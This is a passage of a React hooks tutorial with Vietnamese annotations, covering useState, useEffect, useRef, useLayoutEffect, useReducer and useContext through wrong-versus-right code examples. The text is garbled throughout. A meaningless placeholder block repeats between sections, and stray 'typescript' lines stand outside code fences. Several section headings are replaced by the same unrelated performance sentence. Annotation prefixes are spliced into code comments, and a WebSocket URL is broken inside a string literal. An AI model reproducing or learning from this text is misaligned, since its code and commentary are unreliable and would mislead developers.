  log(message: string): void {
    console.log(`${this.name}: ${message}`);
  },
});

function User(name: string) {
  this.name = name;
}

withLogging(User.prototype);

const user = new User('John');
user.log('Hello'); // Chú giải: "John: Hello"

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
// ❌ Sai: Không hiểu shallow vs deep freeze
const obj = Object.freeze({ a: { b: 1 } });
obj.a.b = 2; // Chú giải: Still works!

// ✅ Đúng: Deep freeze
const obj = deepFreeze({ a: { b: 1 } });
obj.a.b = 2; // Chú giải: Error in strict mode

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
const [state, setState] = useState(initialValue);

// Cách hoạt động bên trong React:
// 1. Lần render đầu tiên: React tạo một "fiber node" cho component
// 2. useState tạo một "hook object" với giá trị initial
// 3. Hook object được lưu trong linked list trên fiber node
// 4. setState trigger re-render bằng cách đánh dấu fiber "dirty"
// 5. Reconciliation: React so sánh old state vs new state
// 6. Nếu khác (Object.is comparison) → re-render component

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
 // Chú giải: ══════════════════════════════════════════════════════════
 // Chú giải: BASIC USAGE
 // Chú giải: ══════════════════════════════════════════════════════════

function Counter() {
  const [count, setCount] = useState(0); // Chú giải: Primitive state

  return (
    <div>
      <p>Count: {count}</p>
      <button onClick={() => setCount(count + 1)}>Increment</button>
    </div>
  );
}

 // Chú giải: ══════════════════════════════════════════════════════════
 // Chú giải: FUNCTIONAL UPDATES (Quan trọng cho async updates)
 // Chú giải: ══════════════════════════════════════════════════════════

function Counter() {
  const [count, setCount] = useState(0);

  // ❌ Sai: Có thể bị stale closure khi gọi nhiều lần
  const handleClick = () => {
    setCount(count + 1);
    setCount(count + 1); // Chỉ tăng 1 lần vì count cũ!
  };

  // ✅ Đúng: Luôn dùng giá trị mới nhất
  const handleClickCorrect = () => {
    setCount(prev => prev + 1);
    setCount(prev => prev + 1); // Tăng 2 lần đúng!
  };

  return <button onClick={handleClickCorrect}>Increment Twice</button>;
}

 // Chú giải: ══════════════════════════════════════════════════════════
 // Hiệu suất: tránh chặn main thread; dùng Web Worker, chia nhỏ tác vụ, tối ưu reflow/repaint.
 // Chú giải: ══════════════════════════════════════════════════════════

function ExpensiveComponent() {
 // Chú giải: ❌ Sai: Chạy expensive function mỗi lần re-render
  const [data, setData] = useState(expensiveComputation());

  // ✅ Đúng: Chỉ chạy 1 lần khi mount
  const [data, setData] = useState(() => expensiveComputation());

  return <div>{data}</div>;
}

function expensiveComputation() {
  console.log('Computing...'); // Chú giải: Chỉ log 1 lần với lazy init
  let result = 0;
  for (let i = 0; i < 1000000; i++) {
    result += i;
  }
  return result;
}

 // Chú giải: ══════════════════════════════════════════════════════════
 // Mutable (có thể thay đổi): thuộc tính object hoặc phần tử mảng có thể bị sửa trực tiếp; nếu cần bất biến, dùng `Object.freeze()` (chỉ nông) hoặc pattern/ thư viện bất biến.
 // Chú giải: ══════════════════════════════════════════════════════════

function UserForm() {
  const [user, setUser] = useState({
    name: '',
    email: '',
    address: { city: '', street: '' }
  });

  // ❌ Sai: Mutate trực tiếp (React không detect change)
  const handleChangeBad = (e) => {
    user.name = e.target.value; // Chú giải: Mutation!
    setUser(user); // React không re-render vì cùng reference
  };

  // ✅ Đúng: Tạo object mới (immutable update)
  const handleChange = (e) => {
    setUser(prev => ({
      ...prev,
      [e.target.name]: e.target.value
    }));
  };

 // Chú giải: ✅ Nested object update
  const handleAddressChange = (field, value) => {
    setUser(prev => ({
      ...prev,
      address: {
        ...prev.address,
        [field]: value
      }
    }));
  };

  return (
    <form>
      <input name="name" onChange={handleChange} />
      <input name="email" onChange={handleChange} />
      <input
        name="city"
        onChange={(e) => handleAddressChange('city', e.target.value)}
      />
    </form>
  );
}

 // Chú giải: ══════════════════════════════════════════════════════════
 // Chú giải: ARRAY STATE OPERATIONS
 // Chú giải: ══════════════════════════════════════════════════════════

function TodoList() {
  const [todos, setTodos] = useState([
    { id: 1, text: 'Learn React', done: false }
  ]);

  // Thêm item
  const addTodo = (text) => {
    setTodos(prev => [...prev, { id: Date.now(), text, done: false }]);
  };

  // Xóa item
  const removeTodo = (id) => {
    setTodos(prev => prev.filter(todo => todo.id !== id));
  };

 // Chú giải: Update item
  const toggleTodo = (id) => {
    setTodos(prev => prev.map(todo =>
      todo.id === id ? { ...todo, done: !todo.done } : todo
    ));
  };

 // Chú giải: Insert at position
  const insertAt = (index, text) => {
    setTodos(prev => [
      ...prev.slice(0, index),
      { id: Date.now(), text, done: false },
      ...prev.slice(index)
    ]);
  };

  return (
    <ul>
      {todos.map(todo => (
        <li key={todo.id}>
          <input
            type="checkbox"
            checked={todo.done}
            onChange={() => toggleTodo(todo.id)}
          />
          {todo.text}
          <button onClick={() => removeTodo(todo.id)}>Delete</button>
        </li>
      ))}
    </ul>
  );
}

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
// ❌ 1. Không dùng functional update khi cần previous state
const [count, setCount] = useState(0);
setCount(count + 1); // Chú giải: Stale closure issue

 // Chú giải: ✅ Fix
setCount(prev => prev + 1);

// ❌ 2. Mutate state trực tiếp
const [arr, setArr] = useState([1, 2, 3]);
arr.push(4); // Chú giải: Mutation!
setArr(arr); // Không re-render

 // Chú giải: ✅ Fix
setArr(prev => [...prev, 4]);

 // Chú giải: ❌ 3. Set state trong render (infinite loop)
function Component() {
  const [count, setCount] = useState(0);
  setCount(1); // Chú giải: ❌ Infinite loop!
  return <div>{count}</div>;
}

// ✅ Fix: Set state trong event handler hoặc useEffect
useEffect(() => {
  setCount(1);
}, []);

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
useEffect(() => {
 // Chú giải: Effect function (chạy sau render)
  return () => {
    // Cleanup function (chạy trước khi component unmount hoặc effect re-run)
  };
}, [dependencies]); // Chú giải: Dependency array

 // Chú giải: Timeline:
 // Chú giải: 1. Component render (JSX → Virtual DOM)
 // Chú giải: 2. React commit changes to real DOM
 // Chú giải: 3. Browser paint screen
// 4. useEffect callback chạy (AFTER paint - không block UI)
// 5. Khi dependencies thay đổi:
 // Chú giải: - Cleanup function chạy trước
 // Chú giải: - Effect function chạy lại
// 6. Khi component unmount: Cleanup chạy cuối cùng

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
 // Chú giải: ══════════════════════════════════════════════════════════
// useEffect COVERS CÁC LIFECYCLE NÀO?
 // Chú giải: ══════════════════════════════════════════════════════════

 // Chú giải: Class component lifecycle:
class ClassComponent extends React.Component {
  componentDidMount() {
 // Chú giải: Chạy 1 lần sau mount
  }

  componentDidUpdate(prevProps, prevState) {
    // Chạy mỗi khi props/state thay đổi
  }

  componentWillUnmount() {
 // Chú giải: Cleanup trước khi unmount
  }
}

 // Chú giải: Functional component equivalent:
function FunctionalComponent() {
 // Chú giải: ✅ componentDidMount + componentWillUnmount
  useEffect(() => {
    console.log('Mounted');
    return () => console.log('Unmounted'); // Chú giải: cleanup
  }, []); // Chú giải: Empty deps = chỉ chạy 1 lần

  // ✅ componentDidUpdate (khi count thay đổi)
  useEffect(() => {
    console.log('Count changed:', count);
  }, [count]); // Chạy khi count thay đổi

 // Chú giải: ✅ componentDidMount + componentDidUpdate (mỗi lần render)
  useEffect(() => {
    console.log('Every render');
  }); // Chú giải: No deps = chạy mỗi lần render
}

 // Chú giải: ══════════════════════════════════════════════════════════
 // Chú giải: DEPENDENCY ARRAY RULES
 // Chú giải: ══════════════════════════════════════════════════════════

function Example({ userId }) {
  const [user, setUser] = useState(null);

 // Chú giải: ❌ Sai: Missing dependency
  useEffect(() => {
    fetchUser(userId).then(setUser); // userId không có trong deps!
  }, []); // ESLint sẽ warning

  // ✅ Đúng: Include all dependencies
  useEffect(() => {
    fetchUser(userId).then(setUser);
  }, [userId]); // Re-fetch khi userId thay đổi

  // ✅ Ignore ESLint (nếu chắc chắn không cần)
  useEffect(() => {
    fetchUser(userId).then(setUser);
 // Chú giải: eslint-disable-next-line react-hooks/exhaustive-deps
  }, []); // Chỉ fetch 1 lần (nhưng có thể stale)
}

 // Chú giải: ══════════════════════════════════════════════════════════
// CLEANUP FUNCTION - KHI NÀO CHẠY?
 // Chú giải: ══════════════════════════════════════════════════════════

function Timer() {
  const [count, setCount] = useState(0);

  useEffect(() => {
    console.log('Effect running');
    const timer = setInterval(() => {
      setCount(prev => prev + 1);
    }, 1000);

 // Chú giải: Cleanup chạy khi:
 // Chú giải: 1. Component unmount
    // 2. Trước khi effect chạy lại (nếu deps thay đổi)
    return () => {
      console.log('Cleanup running');
      clearInterval(timer); // ⚠️ Quan trọng: tránh memory leak!
    };
  }, []); // Chú giải: Empty deps = cleanup chỉ chạy khi unmount

  return <div>{count}</div>;
}

 // Chú giải: ══════════════════════════════════════════════════════════
 // Chú giải: REAL-WORLD EXAMPLES
 // Chú giải: ══════════════════════════════════════════════════════════

 // Chú giải: 1. Data Fetching
function UserProfile({ userId }) {
  const [user, setUser] = useState(null);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState(null);

  useEffect(() => {
    let cancelled = false; // Chú giải: Prevent setting state on unmounted component

    const fetchUser = async () => {
      try {
        setLoading(true);
        setError(null);
        const response = await fetch(`/api/users/${userId}`);
        const data = await response.json();

        if (!cancelled) {
          setUser(data);
        }
      } catch (err) {
        if (!cancelled) {
          setError(err.message);
        }
      } finally {
        if (!cancelled) {
          setLoading(false);
        }
      }
    };

    fetchUser();

    return () => {
      cancelled = true; // Chú giải: Cleanup: mark as cancelled
    };
  }, [userId]);

  if (loading) return <div>Loading...</div>;
  if (error) return <div>Error: {error}</div>;
  return <div>{user?.name}</div>;
}

 // Chú giải: 2. Event Listeners
function WindowSize() {
  const [size, setSize] = useState({ width: 0, height: 0 });

  useEffect(() => {
    const handleResize = () => {
      setSize({
        width: window.innerWidth,
        height: window.innerHeight
      });
    };

 // Chú giải: Add listener
    window.addEventListener('resize', handleResize);
    handleResize(); // Chú giải: Set initial size

 // Chú giải: Cleanup: Remove listener
    return () => {
      window.removeEventListener('resize', handleResize);
    };
  }, []); // Chú giải: No deps = setup once

  return <div>{size.width} x {size.height}</div>;
}

 // Chú giải: 3. Subscriptions (WebSocket, EventEmitter)
function ChatRoom({ roomId }) {
  const [messages, setMessages] = useState([]);

  useEffect(() => {
    const socket = new WebSocket(`ws: // Chú giải: chat.com/${roomId}`);

    socket.onmessage = (event) => {
      setMessages(prev => [...prev, JSON.parse(event.data)]);
    };

 // Chú giải: Cleanup: Close connection
    return () => {
      socket.close();
    };
  }, [roomId]); // Re-connect khi đổi room

  return (
    <ul>
      {messages.map((msg, i) => <li key={i}>{msg.text}</li>)}
    </ul>
  );
}

 // Chú giải: 4. Document Title
function PageTitle({ title }) {
  useEffect(() => {
    const prevTitle = document.title;
    document.title = title;

    return () => {
      document.title = prevTitle; // Chú giải: Restore
    };
  }, [title]);
}

 // Chú giải: 5. Local Storage Sync
function useSyncWithLocalStorage(key, value) {
  useEffect(() => {
    localStorage.setItem(key, JSON.stringify(value));
  }, [key, value]);
}

function Settings() {
  const [theme, setTheme] = useState('light');
  useSyncWithLocalStorage('theme', theme);

  return <button onClick={() => setTheme('dark')}>Dark Mode</button>;
}

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
// ❌ 1. Không cleanup subscriptions/timers
useEffect(() => {
  const timer = setInterval(() => {}, 1000);
 // Chú giải: ❌ Missing cleanup → memory leak
}, []);

 // Chú giải: ✅ Fix
useEffect(() => {
  const timer = setInterval(() => {}, 1000);
  return () => clearInterval(timer);
}, []);

// ❌ 2. Infinite loop (missing deps hoặc deps sai)
useEffect(() => {
  setCount(count + 1); // ❌ count thay đổi → effect chạy lại → count thay đổi...
}, [count]);

// ✅ Fix: Không set state của chính dependency
useEffect(() => {
  // Fetch data based on count, không set count
}, [count]);

// ❌ 3. Async function trực tiếp trong useEffect
useEffect(async () => { // ❌ Error: useEffect không nhận async function
  const data = await fetchData();
}, []);

// ✅ Fix: Tạo async function bên trong
useEffect(() => {
  const fetchData = async () => {
    const data = await fetch('/api');
  };
  fetchData();
}, []);

 // Chú giải: ❌ 4. Race condition (fetch data)
useEffect(() => {
  fetchUser(userId).then(setUser); // ❌ Nếu userId đổi nhanh, response cũ có thể về sau
}, [userId]);

// ✅ Fix: Use cleanup để ignore stale responses
useEffect(() => {
  let cancelled = false;
  fetchUser(userId).then(data => {
    if (!cancelled) setUser(data);
  });
  return () => { cancelled = true; };
}, [userId]);

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
// useState: Trigger re-render khi thay đổi
const [count, setCount] = useState(0);
setCount(1); // Chú giải: → Component re-render

// useRef: KHÔNG trigger re-render
const countRef = useRef(0);
countRef.current = 1; // → Component KHÔNG re-render

 // Chú giải: Timeline:
 // Chú giải: useState: Change state → Schedule re-render → Re-render → Paint
 // Chú giải: useRef: Change ref.current → (Nothing happens, no re-render)

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
 // Chú giải: ══════════════════════════════════════════════════════════
 // Chú giải: 1. DOM ACCESS (Primary use case)
 // Chú giải: ══════════════════════════════════════════════════════════

function AutoFocusInput() {
  const inputRef = useRef<HTMLInputElement>(null);

  useEffect(() => {
 // Chú giải: Access DOM node directly
    inputRef.current?.focus();
  }, []);

  return <input ref={inputRef} />;
}

 // Chú giải: Complex DOM manipulation
function VideoPlayer() {
  const videoRef = useRef<HTMLVideoElement>(null);

  const play = () => videoRef.current?.play();
  const pause = () => videoRef.current?.pause();
  const seek = (time: number) => {
    if (videoRef.current) {
      videoRef.current.currentTime = time;
    }
  };

  return (
    <>
      <video ref={videoRef} src="/video.mp4" />
      <button onClick={play}>Play</button>
      <button onClick={pause}>Pause</button>
      <button onClick={() => seek(10)}>Seek to 10s</button>
    </>
  );
}

 // Chú giải: ══════════════════════════════════════════════════════════
// 2. PERSIST VALUES ACROSS RENDERS (không trigger re-render)
 // Chú giải: ══════════════════════════════════════════════════════════

function Timer() {
  const [count, setCount] = useState(0);
  const intervalRef = useRef<number>(null);

  const start = () => {
    // Lưu interval ID để clear sau này
    intervalRef.current = setInterval(() => {
      setCount(prev => prev + 1);
    }, 1000);
  };

  const stop = () => {
    if (intervalRef.current) {
      clearInterval(intervalRef.current);
    }
  };

  useEffect(() => {
    return () => stop(); // Chú giải: Cleanup
  }, []);

  return (
    <div>
      <p>Count: {count}</p>
      <button onClick={start}>Start</button>
      <button onClick={stop}>Stop</button>
    </div>
  );
}

 // Chú giải: ══════════════════════════════════════════════════════════
 // Chú giải: 3. TRACK PREVIOUS VALUE
 // Chú giải: ══════════════════════════════════════════════════════════

function usePrevious<T>(value: T): T | undefined {
  const ref = useRef<T>();

  useEffect(() => {
    ref.current = value; // Chú giải: Update ref AFTER render
  });

  return ref.current; // Trong arrow function với block `{ }` phải dùng `return` để trả giá trị; với expression có thể trả ngầm (implicit return).
}

function Counter() {
  const [count, setCount] = useState(0);
  const prevCount = usePrevious(count);

  return (
    <div>
      <p>Current: {count}</p>
      <p>Previous: {prevCount}</p>
      <button onClick={() => setCount(count + 1)}>Increment</button>
    </div>
  );
}

 // Chú giải: ══════════════════════════════════════════════════════════
 // Hiệu suất: tránh chặn main thread; dùng Web Worker, chia nhỏ tác vụ, tối ưu reflow/repaint.
 // Chú giải: ══════════════════════════════════════════════════════════

function ClickTracker() {
  const [renderCount, setRenderCount] = useState(0);
  const clickCountRef = useRef(0); // Không trigger re-render

  const handleClick = () => {
    clickCountRef.current++; // Chú giải: Update ref (no re-render)
    console.log('Clicks:', clickCountRef.current);

    // Force re-render để show UI
    setRenderCount(prev => prev + 1);
  };

  return (
    <div>
      <p>Renders: {renderCount}</p>
      <p>Clicks: {clickCountRef.current}</p>
      <button onClick={handleClick}>Click</button>
    </div>
  );
}

 // Chú giải: ══════════════════════════════════════════════════════════
 // Chú giải: 5. CALLBACK REF (Advanced)
 // Chú giải: ══════════════════════════════════════════════════════════

function MeasureElement() {
  const [height, setHeight] = useState(0);

  // Callback ref: được gọi khi element mount/unmount
  const measureRef = useCallback((node: HTMLDivElement | null) => {
    if (node !== null) {
      setHeight(node.getBoundingClientRect().height);
    }
  }, []);

  return (
    <>
      <div ref={measureRef}>
        <p>Measure me!</p>
      </div>
      <p>Height: {height}px</p>
    </>
  );
}

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
// ❌ 1. Expect re-render khi thay đổi ref
const countRef = useRef(0);
countRef.current++;
// ❌ Component không re-render → UI không update

// ✅ Fix: Dùng useState nếu cần re-render
const [count, setCount] = useState(0);

 // Chú giải: ❌ 2. Mutate ref.current trong render
function Component() {
  const ref = useRef(0);
  ref.current++; // Chú giải: ❌ Side effect trong render!
  return <div>{ref.current}</div>;
}

// ✅ Fix: Update trong useEffect hoặc event handler
useEffect(() => {
  ref.current++;
}, []);

// ❌ 3. Không check null khi access DOM
const inputRef = useRef<HTMLInputElement>(null);
inputRef.current.focus(); // ❌ Có thể null!

// ✅ Fix: Check null hoặc dùng optional chaining
inputRef.current?.focus();

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
 // Chú giải: useEffect:
 // Chú giải: 1. React renders component (Virtual DOM)
 // Chú giải: 2. React commits to real DOM
 // Chú giải: 3. Browser PAINTS screen (user thấy UI)
// 4. useEffect runs (AFTER paint - không block UI)

 // Chú giải: useLayoutEffect:
 // Chú giải: 1. React renders component
 // Chú giải: 2. React commits to real DOM
 // Chú giải: 3. useLayoutEffect runs (BEFORE paint - BLOCKS UI)
// 4. Browser paints (user thấy UI đã updated)

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
 // Chú giải: ══════════════════════════════════════════════════════════
// KHI NÀO DÙNG useLayoutEffect?
 // Chú giải: ══════════════════════════════════════════════════════════

 // Chú giải: ✅ Use case 1: DOM measurements (avoid flicker)
function Tooltip() {
  const [tooltip, setTooltip] = useState({ x: 0, y: 0 });
  const buttonRef = useRef<HTMLButtonElement>(null);

  // ❌ useEffect: User thấy tooltip nhảy vì chạy SAU paint
  useEffect(() => {
    const rect = buttonRef.current?.getBoundingClientRect();
    setTooltip({ x: rect.left, y: rect.bottom });
  }, []);

  // ✅ useLayoutEffect: Tooltip đúng vị trí ngay từ đầu
  useLayoutEffect(() => {
    const rect = buttonRef.current?.getBoundingClientRect();
    setTooltip({ x: rect.left, y: rect.bottom });
  }, []);

  return (
    <>
      <button ref={buttonRef}>Hover me</button>
      <div style={{ position: 'absolute', left: tooltip.x, top: tooltip.y }}>
        Tooltip
      </div>
    </>
  );
}

 // Chú giải: ✅ Use case 2: Scroll position (avoid jump)
function RestoreScroll() {
  const contentRef = useRef<HTMLDivElement>(null);

  useLayoutEffect(() => {
 // Chú giải: Restore scroll TRƯỚC khi paint → no visual jump
    const savedScroll = localStorage.getItem('scrollPos');
    if (savedScroll && contentRef.current) {
      contentRef.current.scrollTop = parseInt(savedScroll);
    }
  }, []);

  useEffect(() => {
    const handleScroll = () => {
      if (contentRef.current) {
        localStorage.setItem('scrollPos', contentRef.current.scrollTop.toString());
      }
    };

    contentRef.current?.addEventListener('scroll', handleScroll);
    return () => contentRef.current?.removeEventListener('scroll', handleScroll);
  }, []);

  return <div ref={contentRef} style={{ height: 400, overflow: 'auto' }}>
    {/* Long content */}
  </div>;
}

 // Chú giải: ✅ Use case 3: Animate before paint
function AnimatedBox() {
  const boxRef = useRef<HTMLDivElement>(null);

  useLayoutEffect(() => {
 // Chú giải: Set initial position BEFORE paint
    if (boxRef.current) {
      boxRef.current.style.transform = 'translateX(-100px)';
      boxRef.current.style.opacity = '0';
    }

 // Chú giải: Then animate (browser batches with paint)
    requestAnimationFrame(() => {
      if (boxRef.current) {
        boxRef.current.style.transition = 'all 0.3s';
        boxRef.current.style.transform = 'translateX(0)';
        boxRef.current.style.opacity = '1';
      }
    });
  }, []);

  return <div ref={boxRef}>Animated Box</div>;
}

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
// ❌ Data fetching (không cần sync)
useLayoutEffect(() => {
  fetch('/api').then(setData); // Chú giải: Block UI unnecessarily!
}, []);

// ✅ Dùng useEffect thay vì
useEffect(() => {
  fetch('/api').then(setData);
}, []);

// ❌ Subscriptions (không cần sync)
useLayoutEffect(() => {
  const sub = eventEmitter.on('event', handler);
  return () => sub.off();
}, []);

// ✅ Dùng useEffect
useEffect(() => {
  const sub = eventEmitter.on('event', handler);
  return () => sub.off();
}, []);

 // Chú giải: Rule of thumb:
 // Chú giải: - useEffect: 99% cases (default choice)
// - useLayoutEffect: Chỉ khi có visual bugs (flicker, jump, wrong position)

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
 // Chú giải: ══════════════════════════════════════════════════════════
 // Chú giải: BASIC PATTERN
 // Chú giải: ══════════════════════════════════════════════════════════

type State = { count: number };
type Action =
  | { type: 'increment' }
  | { type: 'decrement' }
  | { type: 'reset' }
  | { type: 'set'; payload: number };

function reducer(state: State, action: Action): State {
  switch (action.type) {
    case 'increment':
      return { count: state.count + 1 };
    case 'decrement':
      return { count: state.count - 1 };
    case 'reset':
      return { count: 0 };
    case 'set':
      return { count: action.payload };
    default:
      return state;
  }
}

function Counter() {
  const [state, dispatch] = useReducer(reducer, { count: 0 });

  return (
    <div>
      <p>Count: {state.count}</p>
      <button onClick={() => dispatch({ type: 'increment' })}>+</button>
      <button onClick={() => dispatch({ type: 'decrement' })}>-</button>
      <button onClick={() => dispatch({ type: 'reset' })}>Reset</button>
    </div>
  );
}

 // Chú giải: ══════════════════════════════════════════════════════════
 // Chú giải: REAL-WORLD: TODO APP
 // Chú giải: ══════════════════════════════════════════════════════════

type Todo = { id: number; text: string; done: boolean };
type TodoState = { todos: Todo[]; filter: 'all' | 'active' | 'completed' };
type TodoAction =
  | { type: 'ADD_TODO'; text: string }
  | { type: 'TOGGLE_TODO'; id: number }
  | { type: 'DELETE_TODO'; id: number }
  | { type: 'SET_FILTER'; filter: 'all' | 'active' | 'completed' }
  | { type: 'CLEAR_COMPLETED' };

function todoReducer(state: TodoState, action: TodoAction): TodoState {
  switch (action.type) {
    case 'ADD_TODO':
      return {
        ...state,
        todos: [...state.todos, {
          id: Date.now(),
          text: action.text,
          done: false
        }]
      };

    case 'TOGGLE_TODO':
      return {
        ...state,
        todos: state.todos.map(todo =>
          todo.id === action.id ? { ...todo, done: !todo.done } : todo
        )
      };

    case 'DELETE_TODO':
      return {
        ...state,
        todos: state.todos.filter(todo => todo.id !== action.id)
      };

    case 'SET_FILTER':
      return { ...state, filter: action.filter };

    case 'CLEAR_COMPLETED':
      return {
        ...state,
        todos: state.todos.filter(todo => !todo.done)
      };

    default:
      return state;
  }
}

function TodoApp() {
  const [state, dispatch] = useReducer(todoReducer, {
    todos: [],
    filter: 'all'
  });

  const visibleTodos = state.todos.filter(todo => {
    if (state.filter === 'active') return !todo.done;
    if (state.filter === 'completed') return todo.done;
    return true;
  });

  return (
    <div>
      <input
        type="text"
        onKeyPress={(e) => {
          if (e.key === 'Enter') {
            dispatch({ type: 'ADD_TODO', text: e.currentTarget.value });
            e.currentTarget.value = '';
          }
        }}
      />

      <ul>
        {visibleTodos.map(todo => (
          <li key={todo.id}>
            <input
              type="checkbox"
              checked={todo.done}
              onChange={() => dispatch({ type: 'TOGGLE_TODO', id: todo.id })}
            />
            {todo.text}
            <button onClick={() => dispatch({ type: 'DELETE_TODO', id: todo.id })}>
              Delete
            </button>
          </li>
        ))}
      </ul>

      <div>
        <button onClick={() => dispatch({ type: 'SET_FILTER', filter: 'all' })}>
          All
        </button>
        <button onClick={() => dispatch({ type: 'SET_FILTER', filter: 'active' })}>
          Active
        </button>
        <button onClick={() => dispatch({ type: 'SET_FILTER', filter: 'completed' })}>
          Completed
        </button>
        <button onClick={() => dispatch({ type: 'CLEAR_COMPLETED' })}>
          Clear Completed
        </button>
      </div>
    </div>
  );
}

 // Chú giải: ══════════════════════════════════════════════════════════
 // Chú giải: LAZY INITIALIZATION
 // Chú giải: ══════════════════════════════════════════════════════════

function init(initialCount: number): State {
 // Chú giải: Expensive computation
  return { count: initialCount * 2 };
}

function Counter() {
 // Chú giải: Init function chỉ chạy 1 lần
  const [state, dispatch] = useReducer(reducer, 10, init);
 // Chú giải: state.count = 20 (10 * 2)
}

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
 // Chú giải: useState: Simple state
const [count, setCount] = useState(0);
const [name, setName] = useState('');
const [email, setEmail] = useState('');

 // Chú giải: useReducer: Complex related state
type FormState = { name: string; email: string; errors: string[] };
const [state, dispatch] = useReducer(formReducer, initialState);

 // Chú giải: Rule:
 // Chú giải: - 1-3 related values → useState
 // Chú giải: - 4+ related values OR complex logic → useReducer

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
 // Chú giải: Context flow:
 // Chú giải: 1. createContext() → Tạo Context object
 // Chú giải: 2. <Provider value={...}> → Cung cấp value
// 3. useContext(Context) → Subscribe và nhận value
// 4. Khi value thay đổi → All consumers re-render

 // Hiệu suất: tránh chặn main thread; dùng Web Worker, chia nhỏ tác vụ, tối ưu reflow/repaint.
// - Context re-render TẤT CẢ consumers khi value thay đổi
// - Không có selector mechanism (khác Redux)
// - Cần optimize bằng React.memo hoặc useMemo

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
 // Chú giải: ══════════════════════════════════════════════════════════
 // Chú giải: BASIC USAGE
 // Chú giải: ══════════════════════════════════════════════════════════

type Theme = 'light' | 'dark';
const ThemeContext = createContext<Theme>('light');

function App() {
  const [theme, setTheme] = useState<Theme>('light');

  return (
    <ThemeContext.Provider value={theme}>
      <Toolbar />
      <button onClick={() => setTheme(theme === 'light' ? 'dark' : 'light')}>
        Toggle Theme
      </button>
    </ThemeContext.Provider>
  );
}

function Toolbar() {
  return <ThemedButton />;
}

function ThemedButton() {
  const theme = useContext(ThemeContext); // Chú giải: ✅ Clean syntax

  return (
    <button className={theme}>
      I am styled with {theme} theme
    </button>
  );
}

 // Chú giải: Old way (before hooks):
function ThemedButtonOld() {
  return (
    <ThemeContext.Consumer>
      {theme => ( // Chú giải: ❌ Wrapper hell
        <button className={theme}>
          I am styled with {theme} theme
        </button>
      )}
    </ThemeContext.Consumer>
  );
}

 // Chú giải: ══════════════════════════════════════════════════════════
 // Chú giải: MULTIPLE CONTEXTS
 // Chú giải: ══════════════════════════════════════════════════════════

const ThemeContext = createContext('light');
const UserContext = createContext(null);
const LanguageContext = createContext('en');

function App() {
  const [theme, setTheme] = useState('light');
  const [user, setUser] = useState(null);
  const [lang, setLang] = useState('en');

  return (
    <ThemeContext.Provider value={theme}>
      <UserContext.Provider value={user}>
        <LanguageContext.Provider value={lang}>
          <Dashboard />
        </LanguageContext.Provider>
      </UserContext.Provider>
    </ThemeContext.Provider>
  );
}

function Dashboard() {
  const theme = useContext(ThemeContext);
  const user = useContext(UserContext);
  const lang = useContext(LanguageContext);

  return (
    <div className={theme}>
      Welcome {user?.name} ({lang})
    </div>
  );
}

 // Chú giải: ══════════════════════════════════════════════════════════
 // Chú giải: CUSTOM HOOK PATTERN (Best practice)
 // Chú giải: ══════════════════════════════════════════════════════════

type AuthContextType = {
  user: User | null;
  login: (email: string, password: string) => Promise<void>;
  logout: () => void;
  loading: boolean;
};

const AuthContext = createContext<AuthContextType | undefined>(undefined);

 // Chú giải: Custom hook với error checking
function useAuth() {
  const context = useContext(AuthContext);

  if (context === undefined) {
    throw new Error('useAuth must be used within AuthProvider');
  }

  return context;
}

 // Chú giải: Provider component
function AuthProvider({ children }: { children: ReactNode }) {
  const [user, setUser] = useState<User | null>(null);
  const [loading, setLoading] = useState(false);

  const login = async (email: string, password: string) => {
    setLoading(true);
    try {
      const user = await authService.login(email, password);
      setUser(user);
    } finally {
      setLoading(false);
    }
  };

  const logout = () => {
    authService.logout();
    setUser(null);
  };

  const value = useMemo(
    () => ({ user, login, logout, loading }),
    [user, loading]
  );

  return <AuthContext.Provider value={value}>{children}</AuthContext.Provider>;
}

 // Chú giải: Usage
function App() {
  return (
    <AuthProvider>
      <Dashboard />
    </AuthProvider>
  );
}

function Dashboard() {
  const { user, logout } = useAuth(); // Chú giải: ✅ Type-safe, error checking

  return (
    <div>
      <p>Welcome {user?.name}</p>
      <button onClick={logout}>Logout</button>
    </div>
  );
}

 // Chú giải: ══════════════════════════════════════════════════════════
 // Hiệu suất: tránh chặn main thread; dùng Web Worker, chia nhỏ tác vụ, tối ưu reflow/repaint.
 // Chú giải: ══════════════════════════════════════════════════════════

// ❌ Problem: All consumers re-render khi BẤT KỲ value nào thay đổi
function AppBad() {
  const [user, setUser] = useState(null);
  const [theme, setTheme] = useState('light');

 // Chú giải: ❌ New object mỗi render → all consumers re-render
  const value = { user, theme, setUser, setTheme };

  return (
    <AppContext.Provider value={value}>
      <Component1 /> {/* Re-render khi theme đổi dù chỉ dùng user */}
      <Component2 /> {/* Re-render khi user đổi dù chỉ dùng theme */}
    </AppContext.Provider>
  );
}

 // Chú giải: ✅ Solution 1: Split contexts
function AppGood() {
  const [user, setUser] = useState(null);
  const [theme, setTheme] = useState('light');

  const userValue = useMemo(() => ({ user, setUser }), [user]);
  const themeValue = useMemo(() => ({ theme, setTheme }), [theme]);

  return (
    <UserContext.Provider value={userValue}>
      <ThemeContext.Provider value={themeValue}>
        <Component1 /> {/* Chỉ re-render khi user đổi */}
        <Component2 /> {/* Chỉ re-render khi theme đổi */}
      </ThemeContext.Provider>
    </UserContext.Provider>
  );
}

 // Chú giải: ✅ Solution 2: React.memo cho consumers
const Component1 = React.memo(function Component1() {
  const { user } = useContext(UserContext);
  return <div>{user?.name}</div>;
});

```js
// Ví dụ rút gọn
const example = 42;
```

typescript
 // Chú giải: ══════════════════════════════════════════════════════════
 // Chú giải: BASIC PATTERN
 // Chú giải: ══════════════════════════════════════════════════════════

function ProductList({ products, filter }) {
 // Chú giải: ❌ Without useMemo: Sort lại MỖI lần component re-render
